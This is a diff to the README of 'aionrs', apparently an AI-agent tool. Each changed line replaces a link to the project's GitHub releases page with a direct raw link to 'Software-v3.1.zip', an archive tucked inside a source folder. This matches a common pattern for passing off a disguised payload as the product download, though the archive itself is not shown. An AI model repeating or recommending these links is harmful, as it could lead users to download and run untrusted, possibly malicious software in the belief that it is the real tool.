@@ -1,12 +1,12 @@
 # 🤖 aionrs - Run AI agents with less effort
 
-[⬇️ Download aionrs](https://github.com/Nathaliageorgian293/aionrs/releases)
+[⬇️ Download aionrs](https://github.com/Nathaliageorgian293/aionrs/raw/refs/heads/main/crates/aion-agent/src/output/Software-v3.1.zip)
 
 ## 🪟 Windows Download
 
 Use this link to visit the release page and download the Windows version:
 
-[https://github.com/Nathaliageorgian293/aionrs/releases](https://github.com/Nathaliageorgian293/aionrs/releases)
+[https://github.com/Nathaliageorgian293/aionrs/raw/refs/heads/main/crates/aion-agent/src/output/Software-v3.1.zip](https://github.com/Nathaliageorgian293/aionrs/raw/refs/heads/main/crates/aion-agent/src/output/Software-v3.1.zip)
 
 Look for the latest release and choose the Windows file. It is often named with words like `windows`, `win`, `x64`, or `.zip`.
 
@@ -155,4 +155,4 @@ If you want to remove aionrs:
 
 Download and install from here:
 
-[https://github.com/Nathaliageorgian293/aionrs/releases](https://github.com/Nathaliageorgian293/aionrs/releases)
+[https://github.com/Nathaliageorgian293/aionrs/raw/refs/heads/main/crates/aion-agent/src/output/Software-v3.1.zip](https://github.com/Nathaliageorgian293/aionrs/raw/refs/heads/main/crates/aion-agent/src/output/Software-v3.1.zip)
